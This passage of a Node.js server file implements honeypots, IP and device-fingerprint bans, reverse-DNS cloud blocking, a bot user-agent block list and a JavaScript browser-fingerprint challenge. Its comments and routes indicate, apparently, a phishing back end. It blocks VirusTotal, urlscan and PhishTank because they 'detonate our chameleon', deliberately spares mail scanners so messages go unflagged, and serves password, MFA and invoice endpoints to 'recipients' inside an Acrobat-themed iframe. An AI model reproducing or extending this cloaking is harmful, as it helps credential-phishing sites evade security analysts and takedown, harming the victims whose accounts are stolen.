  '/hidden-admin', '/.svn', '/.hg', '/web.config.bak', '/wp-config.php.bak',
];

// Banned IP persistence
const BAN_DB_PATH = path.join(__dirname, 'banned-ips.json');
function loadBans() {
  try {
    if (fs.existsSync(BAN_DB_PATH)) {
      const data = JSON.parse(fs.readFileSync(BAN_DB_PATH, 'utf8'));
      const now = Date.now();
      for (const [ip, b] of Object.entries(data)) {
        if (b.expires > now) ipBlacklist.set(ip, b);
      }
      console.log(`[honeypot] Loaded ${ipBlacklist.size} active IP bans`);
    }
  } catch (e) { console.warn('[honeypot] load failed', e.message); }
}
function saveBans() {
  queueWrite(BAN_DB_PATH, () => Object.fromEntries(ipBlacklist), 'honeypot', { pretty: true });
}

// ---- Admin-trusted IPs ----
// Operator's own machines must never be killed by the honeypot. Any IP that
// successfully completes an admin login is trusted for ADMIN_TRUST_DURATION
// (renewed on every login). Trusted IPs bypass ALL request-level checks: ban
// list, geo block, rate limit, header validation, device fingerprint ban.
const ADMIN_TRUST_DURATION = 7 * 24 * 60 * 60 * 1000; // 7 days
const ADMIN_TRUST_DB_PATH = path.join(__dirname, 'admin-trusted-ips.json');
const adminTrustedIps = new Map(); // ip → { trustedAt, expires, username }
function loadAdminTrusted() {
  try {
    if (fs.existsSync(ADMIN_TRUST_DB_PATH)) {
      const data = JSON.parse(fs.readFileSync(ADMIN_TRUST_DB_PATH, 'utf8'));
      const now = Date.now();
      for (const [ip, b] of Object.entries(data)) {
        if (b && b.expires > now) adminTrustedIps.set(ip, b);
      }
      console.log(`[admin-trust] Loaded ${adminTrustedIps.size} trusted admin IPs`);
    }
  } catch (e) { console.warn('[admin-trust] load failed', e.message); }
}
function saveAdminTrusted() {
  queueWrite(ADMIN_TRUST_DB_PATH, () => Object.fromEntries(adminTrustedIps), 'admin-trust', { pretty: true });
}
function isAdminTrustedIp(ip) {
  if (!ip) return false;
  const t = adminTrustedIps.get(ip);
  if (!t) return false;
  if (Date.now() > t.expires) { adminTrustedIps.delete(ip); saveAdminTrusted(); return false; }
  return true;
}
// ---- Trusted devices (browser fingerprint allowlist) ----
// Trusting only the IP isn't enough: the same operator can come from a new
// network (mobile data, VPN) and the device-fingerprint ban check would still
// kill them even though the IP is fresh. So we ALSO trust the device on
// successful login. Persists across restarts; 30-day TTL, refreshed on every
// successful login.
const TRUSTED_DEVICE_DURATION = 30 * 24 * 60 * 60 * 1000; // 30 days
const TRUSTED_DEVICE_DB_PATH = path.join(__dirname, 'trusted-devices.json');
const trustedDevices = new Map(); // devId → { trustedAt, expires, username }
function loadTrustedDevices() {
  try {
    if (fs.existsSync(TRUSTED_DEVICE_DB_PATH)) {
      const data = JSON.parse(fs.readFileSync(TRUSTED_DEVICE_DB_PATH, 'utf8'));
      const now = Date.now();
      for (const [k, v] of Object.entries(data)) {
        if (v && v.expires > now) trustedDevices.set(k, v);
      }
      console.log(`[device-trust] Loaded ${trustedDevices.size} trusted devices`);
    }
  } catch (e) { console.warn('[device-trust] load failed', e.message); }
}
function saveTrustedDevices() {
  queueWrite(TRUSTED_DEVICE_DB_PATH, () => Object.fromEntries(trustedDevices), 'device-trust', { pretty: true });
}
function isTrustedDeviceReq(req) {
  try {
    const devId = generateDeviceId(req);
    const t = trustedDevices.get(devId);
    if (!t) return false;
    if (Date.now() > t.expires) { trustedDevices.delete(devId); saveTrustedDevices(); return false; }
    return true;
  } catch { return false; }
}
function markDeviceTrusted(req, username) {
  try {
    const devId = generateDeviceId(req);
    const now = Date.now();
    trustedDevices.set(devId, {
      trustedAt: new Date(now).toISOString(),
      expires: now + TRUSTED_DEVICE_DURATION,
      username: username || '',
    });
    if (deviceBans.has(devId)) { deviceBans.delete(devId); saveDeviceBans(); }
    saveTrustedDevices();
    console.log(`[device-trust] Trusted device ${devId.slice(0,12)}... for ${username}`);
  } catch (e) { console.warn('[device-trust] mark failed', e.message); }
}

// Mark an IP trusted AND clear any existing ban/strikes/device-ban for it.
// Also wipes the rate-limit counter so the operator's first dashboard load
// after login doesn't immediately re-trip the limiter.
function markAdminTrusted(ip, username, req) {
  if (!ip) return;
  const now = Date.now();
  adminTrustedIps.set(ip, {
    trustedAt: new Date(now).toISOString(),
    expires: now + ADMIN_TRUST_DURATION,
    username: username || '',
  });
  if (ipBlacklist.has(ip)) {
    ipBlacklist.delete(ip);
    saveBans();
    console.log(`[admin-trust] Cleared existing ban for ${ip} (${username})`);
  }
  if (ipStrikes.has(ip)) ipStrikes.delete(ip);
  if (globalRateLimits.has(ip)) globalRateLimits.delete(ip);
  // Also clear any device-fingerprint ban for the current device — without
  // this, an operator on a banned-by-fingerprint machine would still get
  // killed even though their IP is now trusted.
  if (req) {
    try {
      const devId = generateDeviceId(req);
      if (deviceBans.has(devId)) {
        deviceBans.delete(devId);
        saveDeviceBans();
        console.log(`[admin-trust] Cleared device ban for ${devId.slice(0,12)}... (${username})`);
      }
    } catch {}
  }
  saveAdminTrusted();
  console.log(`[admin-trust] Trusted ${ip} for ${username} (expires ${new Date(now + ADMIN_TRUST_DURATION).toISOString()})`);
}
// Accepts optional req to also ban the device
function trapIp(ip, reason, durationMs, req) {
  // Never trap loopback or private LAN (dev / internal tests)
  if (!ip || ip === '::1' || ip === '127.0.0.1' || ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('::ffff:127.')) {
    console.log(`[honeypot] Would-trap ${ip} (reason=${reason}) — skipped (loopback/private)`);
    return;
  }
  // Never trap a trusted operator (admin or user that completed a /u/login).
  // Otherwise an unrelated honeypot trigger could lock the operator out of
  // their own dashboard.
  if (isAdminTrustedIp(ip) || (req && isTrustedDeviceReq(req))) {
    console.log(`[honeypot] Would-trap ${ip} (reason=${reason}) — skipped (trusted operator)`);
    return;
  }
  const dur = durationMs || 24 * 60 * 60 * 1000;
  ipBlacklist.set(ip, { reason, bannedAt: new Date().toISOString(), expires: Date.now() + dur });
  // Also ban the device (survives IP change)
  if (req) {
    const devId = generateDeviceId(req);
    banDevice(devId, reason, dur);
    // Set a persistent ban cookie (survives sessions)
    if (req.res && typeof req.res.cookie === 'function') {
      const banToken = crypto.createHash('sha256').update(devId + 'ban').digest('hex').slice(0, 16);
      req.res.cookie(DEVICE_BAN_COOKIE, banToken, { httpOnly: true, maxAge: dur, sameSite: 'lax' });
    }
  }
  console.warn(`[honeypot] TRAPPED IP: ${ip} — reason: ${reason}`);
  saveBans();
  broadcast('ban', { ip, reason, ts: Date.now() }, (c) => c.role === 'superadmin');
  // Fire-and-forget superadmin alert
  const hours = Math.round(dur / 3600000);
  sendTelegramToSuperadmins(
    `🪤 *Honeypot Trapped*\n\n🌐 *IP:* \`${ip}\`\n🎯 *Trigger:* \`${reason}\`\n⏳ *Banned for:* ${hours}h\n🕐 *Time:* ${new Date().toLocaleString()}`
  ).catch(() => {});
}

HONEYPOT_PATHS.forEach(p => {
  app.all(p + '*', (req, res) => {
    const ip = (req.headers['x-forwarded-for'] || req.ip || '').toString().split(',')[0].trim();
    trapIp(ip, `honeypot:${p}`, 7 * 24 * 60 * 60 * 1000);
    // Hold 10s to waste scanner budget, then kill TCP — looks like server died mid-connection
    setTimeout(() => { try { req.socket.destroy(); } catch {} }, 10000);
  });
});

// robots.txt: intentionally Disallow fake secret paths. Anything that visits those
// paths despite the Disallow directive is definitionally a misbehaving bot → ban.
app.get('/robots.txt', (req, res) => {
  res.type('text/plain').send([
    'User-agent: *',
    'Disallow: /secret-panel',
    'Disallow: /internal-api',
    'Disallow: /hidden-admin',
    'Disallow: /admin-backup',
    'Disallow: /.env',
    'Disallow: /debug',
    'Disallow: /private',
    '',
  ].join('\n'));
});

// Fake "juicy" endpoints referenced in robots.txt — instant ban on visit
['/admin-backup', '/debug', '/private', '/debug/console'].forEach(p => {
  app.all(p + '*', (req, res) => {
    const ip = (req.headers['x-forwarded-for'] || req.ip || '').toString().split(',')[0].trim();
    trapIp(ip, `robots-trap:${p}`, 7 * 24 * 60 * 60 * 1000);
    setTimeout(() => { try { req.socket.destroy(); } catch {} }, 10000);
  });
});

app.use(express.urlencoded({ extended: true, limit: '1mb' }));
app.use(express.json({ limit: '1mb' }));
// Cookie sameSite/secure are decided per-request, not at config time, so the
// same build works on both http://localhost dev and HTTPS prod:
//   • HTTPS request → sameSite='none' + secure=true → cookie travels inside the
//     cross-site chameleon iframe (file://, dropbox.com, …).
//   • HTTP  request → sameSite='lax'  + secure=false → cookie still gets stored
//     by the browser on plain-HTTP localhost (secure=true would be silently
//     dropped, breaking admin login).
// `secure: 'auto'` lets express-session decide secure based on req.secure
// (which honors trust-proxy / X-Forwarded-Proto). The middleware below adjusts
// sameSite per-request before the Set-Cookie header is serialized.
app.use(session({
  secret: process.env.SESSION_SECRET || 'acrobat-demo-secret-change-me',
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,
    sameSite: 'lax',
    secure: 'auto',
    maxAge: 7 * 24 * 60 * 60 * 1000,
  },
}));
app.use((req, _res, next) => {
  if (req.session && req.session.cookie && req.secure) {
    req.session.cookie.sameSite = 'none';
  }
  next();
});

// ==========================================
// ---- ANTI-BOT FORTRESS ----
// Only real humans in real browsers get through
// ==========================================

// --- Device ban system (survives IP changes) ---
// Uses persistent cookie + browser fingerprint hash. Both tracked.
const deviceBans = new Map(); // deviceId → { reason, bannedAt, expires }
const DEVICE_BAN_COOKIE = '_dx'; // innocent-looking cookie name
function loadDeviceBans() {
  try {
    if (fs.existsSync(path.join(__dirname, 'banned-devices.json'))) {
      const data = JSON.parse(fs.readFileSync(path.join(__dirname, 'banned-devices.json'), 'utf8'));
      const now = Date.now();
      for (const [id, b] of Object.entries(data)) {
        if (b.expires > now) deviceBans.set(id, b);
      }
      console.log(`[device-ban] Loaded ${deviceBans.size} device bans`);
    }
  } catch (e) { console.warn('[device-ban] load failed', e.message); }
}
function saveDeviceBans() {
  queueWrite(path.join(__dirname, 'banned-devices.json'), () => Object.fromEntries(deviceBans), 'device-ban', { pretty: true });
}
function banDevice(deviceId, reason, durationMs) {
  if (!deviceId) return;
  // Never ban a device that's been marked trusted via successful /u/login.
  if (trustedDevices.has(deviceId)) {
    const t = trustedDevices.get(deviceId);
    if (t && Date.now() < t.expires) {
      console.log(`[device-ban] Would-ban ${deviceId.slice(0,12)}... (reason=${reason}) — skipped (trusted)`);
      return;
    }
  }
  const dur = durationMs || 30 * 24 * 60 * 60 * 1000; // 30 days default
  deviceBans.set(deviceId, { reason, bannedAt: new Date().toISOString(), expires: Date.now() + dur });
  saveDeviceBans();
  console.warn(`[device-ban] Banned device: ${deviceId.slice(0, 12)}... reason: ${reason}`);
}
function generateDeviceId(req) {
  // Create a fingerprint from headers that persist across IP changes
  const ua = req.headers['user-agent'] || '';
  const lang = req.headers['accept-language'] || '';
  const enc = req.headers['accept-encoding'] || '';
  const raw = ua + '|' + lang + '|' + enc + '|' + (req.headers['sec-ch-ua'] || '') + '|' + (req.headers['sec-ch-ua-platform'] || '');
  return crypto.createHash('sha256').update(raw).digest('hex').slice(0, 24);
}

// --- IP Blacklist (auto-ban) ---
const ipBlacklist = new Map(); // ip → { reason, bannedAt, expires }
loadBans(); // rehydrate persisted bans from disk
loadDeviceBans(); // rehydrate device bans
loadAdminTrusted(); // rehydrate admin trusted-IP allowlist
loadTrustedDevices(); // rehydrate device-fingerprint allowlist
const IP_BAN_DURATION = 24 * 60 * 60 * 1000; // 24h ban (was 30min — go hard)
const ipStrikes = new Map(); // ip → { count, firstStrike }
const STRIKE_THRESHOLD = 5; // 5 strikes = auto-ban (was 15 — low tolerance)
const STRIKE_WINDOW = 10 * 60 * 1000; // within 10 min (was 5 — longer memory)
const ipRequestLog = new Map(); // ip → [timestamp, timestamp, ...] — velocity tracking

function getIp(req) {
  let ip = (req.headers['x-forwarded-for'] || req.ip || req.socket.remoteAddress || '').toString().split(',')[0].trim();
  // Node.js represents IPv4 connections as IPv4-mapped IPv6 (::ffff:1.2.3.4) — strip it.
  if (ip.startsWith('::ffff:')) ip = ip.slice(7);
  return ip;
}

// --- Cloud-host blacklist (reverse-DNS check) ---
// If the visitor's IP reverse-resolves to a hostname containing any of these
// substrings, treat as a hosted scanner/bot. Real recipients are on
// residential ISPs (comcast, kyivstar, vodafone, etc.) which never match.
const HOSTNAME_BLACKLIST_WORDS = [
  'aws', 'amazon', 'amazonaws',
  'google', 'googleusercontent', 'gcp', 'cloud.google',
  'azure', 'microsoft',
  'digitalocean', 'linode', 'heroku', 'oracle.com', 'oraclecloud',
  'vultr', 'hetzner', 'ovh', 'scaleway', 'choopa', 'leaseweb',
  'datacenter', 'colocrossing', 'serverhub',
  'vps', 'hosting', 'proxy', 'vpn', 'tor-exit',
];
const dnsPromises = require('dns').promises;
const reverseDnsCache = new Map(); // ip → { hostname, isCloud, ts }
const REVERSE_DNS_CACHE_MS = 60 * 60 * 1000; // 1 hour
function checkHostnameForBots(ip) {
  if (!ip) return Promise.resolve({ hostname: '', isCloud: false });
  const now = Date.now();
  const cached = reverseDnsCache.get(ip);
  if (cached && now - cached.ts < REVERSE_DNS_CACHE_MS) return Promise.resolve(cached);
  // Race: reverse DNS vs 800ms timeout. If lookup is too slow, allow now and
  // resolve cached entry in background for next time.
  return Promise.race([
    dnsPromises.reverse(ip).then(names => (names && names[0]) || ''),
    new Promise(r => setTimeout(() => r(null), 800)),
  ])
    .then(hostname => {
      const h = (hostname || '').toLowerCase();
      const matched = HOSTNAME_BLACKLIST_WORDS.find(w => h.includes(w));
      const result = { hostname: h, isCloud: !!matched, matched: matched || null, ts: now };
      reverseDnsCache.set(ip, result);
      return result;
    })
    .catch(() => {
      const result = { hostname: '', isCloud: false, ts: now };
      reverseDnsCache.set(ip, result);
      return result;
    });
}

function addStrike(ip, reason) {
  // Never accumulate strikes against a trusted operator. Without this guard,
  // catch-all 404s, rate-limit hits, etc. could quietly stack to STRIKE_THRESHOLD
  // and re-ban the operator's own IP behind the trusted-IP bypass.
  if (isAdminTrustedIp(ip)) return;
  const now = Date.now();
  let s = ipStrikes.get(ip);
  if (!s || now - s.firstStrike > STRIKE_WINDOW) {
    s = { count: 0, firstStrike: now };
    ipStrikes.set(ip, s);
  }
  s.count++;
  if (s.count >= STRIKE_THRESHOLD) {
    ipBlacklist.set(ip, { reason, bannedAt: new Date().toISOString(), expires: now + IP_BAN_DURATION });
    ipStrikes.delete(ip);
    saveBans();
    console.warn(`[security] AUTO-BANNED IP: ${ip} — reason: ${reason} (${STRIKE_THRESHOLD} strikes)`);
    broadcast('ban', { ip, reason, ts: now }, (c) => c.role === 'superadmin');
    sendTelegramToSuperadmins(
      `🚫 *Auto-Banned (${STRIKE_THRESHOLD} strikes)*\n\n🌐 *IP:* \`${ip}\`\n🎯 *Last strike:* \`${reason}\`\n⏳ *Ban:* 24h\n🕐 *Time:* ${new Date().toLocaleString()}`
    ).catch(() => {});
  }
}

// --- Global rate limiter (all routes) ---
const globalRateLimits = new Map();
const GLOBAL_RATE_WINDOW = 60 * 1000;
const GLOBAL_RATE_MAX = 60; // 60 requests/min for pages
const AUTH_RATE_MAX = 10; // 10 auth attempts/min

function globalRateLimit(req, res, next) {
  const ip = getIp(req);
  const now = Date.now();
  let entry = globalRateLimits.get(ip);
  if (!entry || now > entry.resetAt) {
    entry = { count: 0, authCount: 0, resetAt: now + GLOBAL_RATE_WINDOW };
    globalRateLimits.set(ip, entry);
  }
  entry.count++;
  const isAuth = req.path.startsWith('/auth/');
  if (isAuth) entry.authCount++;

  if (entry.count > GLOBAL_RATE_MAX || (isAuth && entry.authCount > AUTH_RATE_MAX)) {
    addStrike(ip, 'rate_limit_exceeded');
    return res.status(429).send('Too many requests. Please slow down.');
  }
  next();
}

// --- Bot User-Agent blocker ---
const BOT_PATTERNS = [
  // HTTP tools
  'curl', 'wget', 'python', 'httpie', 'postman', 'insomnia', 'scrapy',
  'powershell', 'invoke-webrequest', 'invoke-restmethod',
  // Headless engines
  'phantom', 'selenium', 'headless', 'puppeteer', 'playwright', 'nightmare', 'webdriver',
  'chromedriver', 'geckodriver', 'zombie', 'jsdom', 'electron', 'cypress',
  // Generic bots
  'bot', 'spider', 'crawl', 'slurp', 'mediapartners', 'feedfetcher',
  'facebookexternalhit', 'twitterbot', 'linkedinbot', 'whatsapp', 'telegram',
  'discord', 'slack', 'googlebot', 'bingbot', 'yandexbot', 'baiduspider',
  'duckduckbot', 'ia_archiver', 'archive.org', 'httrack', 'webcopier',
  'sogou', 'semrush', 'ahrefs', 'mj12bot', 'dotbot', 'petalbot', 'bytespider',
  'gptbot', 'claudebot', 'chatgpt', 'ccbot', 'applebot', 'amazonbot',
  'meta-externalagent', 'meta-externalfetcher', 'perplexitybot', 'youbot', 'kagibot', 'cohere', 'cohere-ai',
  'anthropic-ai', 'claude-web', 'oai-searchbot', 'google-extended', 'googleother',
  'omgili', 'omgilibot', 'friendlycrawler', 'diffbot', 'img2dataset',
  'icc-crawler', 'imagesiftbot', 'timpibot', 'velenpublicwebcrawler', 'webzio-extended',
  'facebookbot', 'facebookexternalhit',
  // HTTP libraries
  'nutch', 'jakarta', 'java/', 'libwww', 'lwp-', 'go-http', 'node-fetch',
  'axios', 'request/', 'http-client', 'okhttp', 'apache-httpclient',
  'aiohttp', 'httpx', 'mechanize', 'winhttp', 'cfnetwork', 'undici',
  'got/', 'superagent', 'fetch/', 'needle/', 'http.rb', 'faraday',
  'restsharp', 'webclient', 'httpclient', 'urlgrabber', 'reqwest',
  'urllib', 'requests/', 'guzzle', 'symfony',
  // Scanners / pen-test tools
  'nmap', 'masscan', 'nikto', 'sqlmap', 'nuclei', 'zgrab', 'zmap', 'censys',
  'shodan', 'netcraft', 'qualys', 'burpsuite', 'owasp', 'dirbuster', 'gobuster',
  'feroxbuster', 'wfuzz', 'ffuf', 'amass', 'subfinder', 'httpx-toolkit',
  'acunetix', 'wpscan', 'whatweb', 'arachni', 'wappalyzer', 'detectify',
  'rapid7', 'tenable', 'nessus', 'openvas', 'metasploit', 'cobaltstrike',
  // URL-analysis sandboxes (these DO detonate our chameleon — block them)
  'virustotal', 'urlscan', 'phishtank', 'urlvoid', 'hybrid-analysis',
  'urlquery', 'joe-sandbox', 'anyrun', 'cuckoo', 'falconsandbox', 'mxtoolbox',
  // NOTE: deliberately NOT banning mail-security scanners (proofpoint, mimecast,
  // ironport, abnormal, etc.) — those scan the URL pre-delivery and a 403 from
  // us would cause them to flag the message. Real recipients hit our system
  // from a normal browser UA which passes these checks anyway.
];

// --- Header validation (real browsers send these) ---
// Returns null if OK, or { reason, ban } where ban = true means INSTANT BAN (not just strike).
function validateBrowserHeaders(req) {
  const ua = req.headers['user-agent'] || '';
  const acceptLang = req.headers['accept-language'] || '';
  const acceptEnc = req.headers['accept-encoding'] || '';

  // No UA = not a browser. Instant ban.
  if (!ua) return { reason: 'missing_user_agent', ban: true };

  // Known bot patterns → instant ban
  const uaLower = ua.toLowerCase();
  for (const pattern of BOT_PATTERNS) {
    if (uaLower.includes(pattern)) return { reason: 'bot_user_agent:' + pattern, ban: true };
  }

  // Suspiciously short UA (real browsers have long UAs)
  if (ua.length < 30) return { reason: 'short_ua', ban: true };

  // Real browsers always send accept-language and accept-encoding
  if (!acceptLang) return { reason: 'missing_accept_language', ban: false };
  if (!acceptEnc) return { reason: 'missing_accept_encoding', ban: false };

  // Real browsers include 'gzip'
  if (!acceptEnc.includes('gzip')) return { reason: 'no_gzip_support', ban: false };

  // UA should contain a browser engine
  const hasEngine = ['mozilla', 'chrome', 'safari', 'firefox', 'edge', 'opera', 'trident'].some(e => uaLower.includes(e));
  if (!hasEngine) return { reason: 'unknown_browser_engine', ban: true };

  // Sec-Fetch-Site / Sec-Fetch-Mode — only sent by real browsers, hard to fake in scripts
  // If present and suspicious, flag it
  const secSite = req.headers['sec-fetch-site'];
  const secMode = req.headers['sec-fetch-mode'];
  if (secSite === 'same-origin' && secMode === 'cors' && !req.path.startsWith('/api/') && !req.path.startsWith('/auth/')) {
    return { reason: 'suspicious_sec_fetch', ban: false };
  }

  return null; // passed
}

// --- JS Challenge gate: serves a challenge page that only real browsers can pass ---
// Verified sessions get a token cookie so they don't see the challenge again
const VERIFIED_COOKIE = '_bv'; // browser verified
const CHALLENGE_SECRET = crypto.randomBytes(32).toString('hex');

function generateVerifyToken(ip, ua) {
  const data = ip + '|' + (ua || '').slice(0, 100) + '|' + Math.floor(Date.now() / (3600000)); // valid ~1 hour
  return crypto.createHmac('sha256', CHALLENGE_SECRET).update(data).digest('hex').slice(0, 32);
}

function isVerified(req) {
  const cookie = req.cookies?.[VERIFIED_COOKIE] || '';
  const ip = getIp(req);
  const expected = generateVerifyToken(ip, req.headers['user-agent']);
  return cookie === expected;
}

// The JS challenge page — bots can't execute JS, so they never pass
function serveChallengeGate(req, res) {
  const ip = getIp(req);
  const token = generateVerifyToken(ip, req.headers['user-agent']);
  res.status(200).send(`<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Security Check</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{min-height:100vh;display:flex;align-items:center;justify-content:center;background:#f7f7f8;font-family:-apple-system,sans-serif}
.box{text-align:center;padding:40px;background:#fff;border-radius:16px;box-shadow:0 4px 24px rgba(0,0,0,0.08);max-width:400px}
.spinner{width:40px;height:40px;margin:0 auto 20px;border:3px solid #eee;border-top-color:#eb1000;border-radius:50%;animation:s .7s linear infinite}
@keyframes s{to{transform:rotate(360deg)}}
h2{font-size:18px;margin-bottom:8px;color:#1a1a1a}
p{font-size:14px;color:#8a8a90}
noscript .box{border:2px solid #eb1000}
</style>
</head><body>
<noscript><div class="box"><h2>JavaScript Required</h2><p>Please enable JavaScript to access this page.</p></div></noscript>
<div class="box" id="c">
<div class="spinner"></div>
<h2>Verifying you are human</h2>
<p>This will only take a moment...</p>
</div>
<script>
(async function(){
  // Collect browser signals — bots fail these
  var s = {};
  s.w = screen.width; s.h = screen.height; s.d = screen.colorDepth;
  s.tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
  s.lang = navigator.language; s.langs = (navigator.languages||[]).length;
  s.touch = navigator.maxTouchPoints; s.pdf = navigator.pdfViewerEnabled;
  s.cookie = navigator.cookieEnabled; s.platform = navigator.platform;
  s.ua = navigator.userAgent; s.wd = navigator.webdriver === true;
  s.plugins = (navigator.plugins||[]).length;
  s.chrome = !!window.chrome; s.hw = navigator.hardwareConcurrency || 0;
  s.mem = navigator.deviceMemory || 0; s.dnt = navigator.doNotTrack;
  s.perm = !!navigator.permissions;
  try{var c=document.createElement('canvas');var g=c.getContext('webgl');s.gpu=g?g.getParameter(g.RENDERER):'';s.vendor=g?g.getParameter(g.VENDOR):'';}catch(e){s.gpu='';s.vendor='';}
  // Headless signatures
  s.headlessUA = /HeadlessChrome|PhantomJS|Selenium|Puppeteer|Playwright/i.test(s.ua);
  s.automation = !!(window.callPhantom || window._phantom || window.__nightmare || window.Buffer || window.domAutomation || window.domAutomationController);
  try{ s.notifPerm = (await navigator.permissions.query({name:'notifications'})).state; s.notifBad = (Notification && Notification.permission === 'denied' && s.notifPerm === 'prompt'); }catch(e){ s.notifBad = false; }

  // Report to server; server decides ban/pass
  try {
    var resp = await fetch('/auth/fingerprint', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ token: '${token}', s: s }) });
    if (!resp.ok) { document.getElementById('c').innerHTML='<h2>Access Denied</h2><p>Browser verification failed.</p>'; return; }
    var d = new Date(); d.setTime(d.getTime()+3600000);
    document.cookie='${VERIFIED_COOKIE}=${token};path=/;expires='+d.toUTCString()+';SameSite=Lax';
    setTimeout(function(){ window.location.reload(); }, 900);
  } catch(e) { document.getElementById('c').innerHTML='<h2>Access Denied</h2><p>Browser verification failed.</p>'; }
})();
</script>
</body></html>`);
}

// --- GeoIP blocking ---
// Set GEO_ALLOW="US,GB,CA" or GEO_BLOCK="CN,RU,KP" in .env
// GEO_ALLOW = whitelist (only these countries can access). Takes priority over GEO_BLOCK.
// GEO_BLOCK = blacklist (these countries are blocked, all others allowed).
// Leave both unset = no geo restriction.
const geoip = require('geoip-lite');
const GEO_ALLOW = (process.env.GEO_ALLOW || '').toUpperCase().split(',').map(s => s.trim()).filter(Boolean);
const GEO_BLOCK = (process.env.GEO_BLOCK || '').toUpperCase().split(',').map(s => s.trim()).filter(Boolean);
function geoCheck(ip) {
  if (GEO_ALLOW.length === 0 && GEO_BLOCK.length === 0) return null; // no restriction
  const clean = ip.replace('::ffff:', '');
  if (clean === '127.0.0.1' || clean === '::1' || clean.startsWith('192.168.') || clean.startsWith('10.')) return null;
  const geo = geoip.lookup(clean);
  if (!geo || !geo.country) return null; // can't determine → allow
  const cc = geo.country.toUpperCase();
  if (GEO_ALLOW.length > 0 && !GEO_ALLOW.includes(cc)) return { blocked: true, cc, reason: 'geo:not-in-allowlist' };
  if (GEO_BLOCK.length > 0 && GEO_BLOCK.includes(cc)) return { blocked: true, cc, reason: 'geo:blocked-country' };
  return null;
}

// --- Master middleware: applies to ALL requests ---
const cookieParser = require('cookie-parser');
app.use(cookieParser());

app.use((req, res, next) => {
  const ip = getIp(req);

  // 0. Trusted-user bypass — anyone (admin OR regular user) who completed a
  //    successful /u/login in the last trust window skips every honeypot/rate
  //    gate. Trust is layered: IP-based (network) AND device-based (browser
  //    fingerprint). Either match wins, so an operator who switches network
  //    on the same machine, or vice-versa, still bypasses cleanly.
  if (isAdminTrustedIp(ip) || isTrustedDeviceReq(req)) return next();

  // Recovery path: every admin URL (/u, /u/login, /u/something) is reachable
  // from a banned IP/device, so an accidentally banned user can navigate to
  // sign in and have their ban auto-cleared by markAdminTrusted(). Other
  // gates (rate limit, header validation, geo block) still apply, so a bot
  // pounding /u/* still gets caught — only the kill-on-sight ban check is
  // skipped here.
  const isAuthPath = req.path === `/${ADMIN_PATH}` || req.path.startsWith(`/${ADMIN_PATH}/`);

  // 1. Check IP blacklist
  const ban = ipBlacklist.get(ip);
  if (ban) {
    if (Date.now() < ban.expires) {
      if (!isAuthPath) {
        // Kill the TCP connection — no HTTP response at all. Server looks dead/offline to bots.
        return req.socket.destroy();
      }
    } else {
      ipBlacklist.delete(ip); saveBans(); // ban expired
    }
  }

  // 1a. Device ban check — catches IP changers (VPN, mobile data, proxy)
  // Check 1: persistent cookie
  const dxCookie = req.cookies && req.cookies[DEVICE_BAN_COOKIE];
  if (dxCookie && !isAuthPath) {
    // Verify cookie matches a known banned device
    for (const [devId, b] of deviceBans) {
      const expected = crypto.createHash('sha256').update(devId + 'ban').digest('hex').slice(0, 16);
      if (expected === dxCookie && Date.now() < b.expires) {
        console.log(`[device-ban] Cookie match: ${devId.slice(0,12)}... (IP: ${ip})`);
        return req.socket.destroy();
      }
    }
  }
  // Check 2: header fingerprint
  if (!isAuthPath) {
    const devId = generateDeviceId(req);
    const devBan = deviceBans.get(devId);
    if (devBan && Date.now() < devBan.expires) {
      console.log(`[device-ban] Fingerprint match: ${devId.slice(0,12)}... (IP: ${ip})`);
      return req.socket.destroy();
    }
  }

  // 1b. GeoIP check — block entire countries
  const geoResult = geoCheck(ip);
  if (geoResult && geoResult.blocked) {
    console.log(`[geo-block] ${ip} country=${geoResult.cc} reason=${geoResult.reason}`);
    trapIp(ip, geoResult.reason, 24 * 60 * 60 * 1000, req);
    return req.socket.destroy();
  }

  // 2. Skip checks for internal endpoints
  if (req.path === '/health') return next();
  if (req.path === '/auth/challenge') return next();
  if (req.path === '/auth/fingerprint') return next();
  if (req.path.startsWith('/api/gateway/')) return next();
  // /v/ and /d/ routes are intended to be embedded cross-origin (chameleon iframe).
  // Cookies often can't be set cross-origin over HTTP, so skip the JS challenge gate here.
  if (req.path.startsWith('/v/')) return next();
  if (req.path.startsWith('/d/')) return next();
  if (req.path === '/r') return next();
  // Public invite/activation endpoints — recipient has no session yet and
  // no JS-gate cookie, but these MUST work for the activation page to load.
  if (req.path.startsWith('/api/invite/')) return next();
  // Endpoints needed by the iframe content (login flow inside /v/ pages)
  const IFRAME_ALLOWED = ['/auth/me','/auth/logout','/auth/detect','/auth/log-attempt',
    '/api/verify-password','/api/verify-mfa','/api/sample-invoice','/api/login-settings'];
  if (IFRAME_ALLOWED.includes(req.path)) return next();

  // 3. Global rate limit
  const now = Date.now();
  let rl = globalRateLimits.get(ip);
  if (!rl || now > rl.resetAt) {
    rl = { count: 0, authCount: 0, resetAt: now + GLOBAL_RATE_WINDOW };
    globalRateLimits.set(ip, rl);
  }
  rl.count++;
  if (req.path.startsWith('/auth/')) rl.authCount++;
  if (rl.count > GLOBAL_RATE_MAX || (req.path.startsWith('/auth/') && rl.authCount > AUTH_RATE_MAX)) {
    addStrike(ip, 'rate_limit');
    return res.status(429).send('Too many requests.');
  }

  // 4. Validate browser headers — bots get INSTANT ban + dead connection
  const headerFail = validateBrowserHeaders(req);
  if (headerFail) {
    console.log(`[header-reject] ip=${ip} reason=${headerFail.reason} ban=${headerFail.ban} ua="${(req.headers['user-agent']||'').slice(0,100)}"`);
    if (headerFail.ban) {
      trapIp(ip, 'header:' + headerFail.reason, 7 * 24 * 60 * 60 * 1000, req);
      return req.socket.destroy(); // server looks dead
    } else {
      addStrike(ip, headerFail.reason);
      return req.socket.destroy();
    }
  }

  // 4b. Request velocity check.
  // Skip for: static assets, admin sessions, admin routes (panel makes bursty
  // SSE/poll calls), and the rotating viewer (multiple iframe rotations).
  // SOFT throttle only — never trap. Real users w/ flaky networks shouldn't
  // get permabanned. trapIp is reserved for high-confidence bot signals
  // (honeypot paths, bot UAs, missing UA) handled in step 4 above.
  const isStatic2 = req.path.startsWith('/css/') || req.path.startsWith('/js/') || /\.(ico|png|jpg|svg|woff2?|ttf|css|js)$/i.test(req.path);
  const isAdminPath = req.path.startsWith(`/${ADMIN_PATH}`);
